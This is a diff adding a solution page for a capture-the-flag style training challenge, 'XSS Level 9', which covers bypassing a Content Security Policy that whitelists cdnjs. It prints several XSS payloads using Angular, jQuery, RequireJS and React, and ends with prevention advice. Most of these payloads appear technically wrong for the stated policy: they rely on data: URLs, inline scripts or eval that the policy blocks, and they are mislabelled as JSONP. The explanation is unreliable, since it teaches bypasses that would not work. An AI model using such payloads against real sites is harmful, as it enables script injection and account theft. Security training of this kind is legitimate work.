@@ -1,0 +1,151 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 9 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 9 Solution: XSS with CSP Bypass</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how Content Security Policy (CSP) can be bypassed if misconfigured. The application has implemented CSP to protect against XSS, but there's a weakness in the configuration that allows an attacker to execute JavaScript.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to analyze the CSP header, identify the misconfiguration, and craft a payload that bypasses the restrictions.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the CSP</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>First, let's examine the CSP header using browser developer tools:</p>
+                        <pre class="bg-light p-3 rounded"><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' https://via.placeholder.com data:;</code></pre>
+                        
+                        <p>This CSP has the following directives:</p>
+                        <ul>
+                            <li><code>default-src 'self'</code>: By default, only allow resources from the same origin.</li>
+                            <li><code>script-src 'self' https://cdnjs.cloudflare.com</code>: Allow JavaScript from the same origin and cdnjs.cloudflare.com.</li>
+                            <li><code>style-src 'self' 'unsafe-inline'</code>: Allow styles from the same origin and inline styles.</li>
+                            <li><code>img-src 'self' https://via.placeholder.com data:</code>: Allow images from the same origin, via.placeholder.com, and data URLs.</li>
+                        </ul>
+                        
+                        <p>The vulnerability is in the <code>script-src</code> directive, which allows loading scripts from cdnjs.cloudflare.com. This is a common CDN that hosts many JavaScript libraries, some of which can be used to bypass CSP.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Exploiting the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>We can exploit this vulnerability using JSONP (JSON with Padding) from cdnjs.cloudflare.com. JSONP allows loading JSON data with a callback function, which can be used to execute arbitrary JavaScript.</p>
+                        
+                        <h6>Method: Using Angular.js JSONP Callback</h6>
+                        <p>Angular.js has a known CSP bypass using the <code>angular.callbacks._0</code> function. We can use this to execute our payload:</p>
+                        
+                        <ol>
+                            <li>
+                                <p>Post a comment with the following payload:</p>
+                                <pre class="bg-light p-3 rounded"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"&gt;&lt;/script&gt;
+&lt;div ng-app ng-csp&gt;
+  &lt;div ng-include="'data:text/html,&lt;script&gt;alert(\"XSS Level 9 Completed!\")&lt;/script&gt;'"&gt;&lt;/div&gt;
+&lt;/div&gt;</code></pre>
+                            </li>
+                            <li>
+                                <p>When the page loads, Angular.js will be loaded from the allowed CDN, and then the ng-include directive will execute our JavaScript payload.</p>
+                            </li>
+                            <li>
+                                <p>The alert will trigger, revealing the flag.</p>
+                            </li>
+                        </ol>
+                        
+                        <h6 class="mt-4">Alternative Method: Using jQuery JSONP</h6>
+                        <p>Another approach is to use jQuery's JSONP functionality:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+$.getScript('data:application/javascript,alert("XSS Level 9 Completed!")');
+&lt;/script&gt;</code></pre>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Other Potential Bypasses</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>There are several other ways to bypass this CSP configuration:</p>
+                        
+                        <h6>1. Using RequireJS</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+require(['data:application/javascript,alert("XSS Level 9 Completed!")']);
+&lt;/script&gt;</code></pre>
+                        
+                        <h6>2. Using AngularJS Template Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"&gt;&lt;/script&gt;
+&lt;div ng-app&gt;
+  {{constructor.constructor('alert("XSS Level 9 Completed!")')()}}
+&lt;/div&gt;</code></pre>
+                        
+                        <h6>3. Using React with Dangerous Functions</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js"&gt;&lt;/script&gt;
+&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.production.min.js"&gt;&lt;/script&gt;
+&lt;div id="root"&gt;&lt;/div&gt;
+&lt;script&gt;
+ReactDOM.render(
+  React.createElement('div', {
+    dangerouslySetInnerHTML: {
+      __html: '&lt;img src=x onerror="alert(\'XSS Level 9 Completed!\')"&gt;'
+    }
+  }),
+  document.getElementById('root')
+);
+&lt;/script&gt;</code></pre>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>CSP Misconfiguration:</strong> Allowing scripts from external sources like CDNs can introduce security risks.</li>
+                            <li><strong>Trusted Sources Abuse:</strong> Even trusted sources like popular CDNs can be abused for XSS attacks.</li>
+                            <li><strong>JSONP Vulnerabilities:</strong> JSONP can be used to bypass CSP restrictions.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Strict CSP Configuration:</strong> Use a strict CSP that only allows necessary sources and avoids wildcards.</li>
+                            <li><strong>Nonce-based CSP:</strong> Use nonces instead of whitelisting domains for script sources.</li>
+                            <li><strong>Hash-based CSP:</strong> Use hashes to allow only specific scripts.</li>
+                            <li><strong>Avoid 'unsafe-inline':</strong> Avoid using 'unsafe-inline' in script-src directives.</li>
+                            <li><strong>Subresource Integrity (SRI):</strong> Use SRI to ensure the integrity of external resources.</li>
+                            <li><strong>Regular CSP Auditing:</strong> Regularly audit your CSP configuration for potential bypasses.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            CSP bypass vulnerabilities are particularly dangerous because they undermine a key security control that many organizations rely on. Even well-intentioned CSP configurations can contain subtle flaws that allow attackers to execute malicious JavaScript. This highlights the importance of defense in depth and not relying solely on CSP for XSS protection.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level9') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
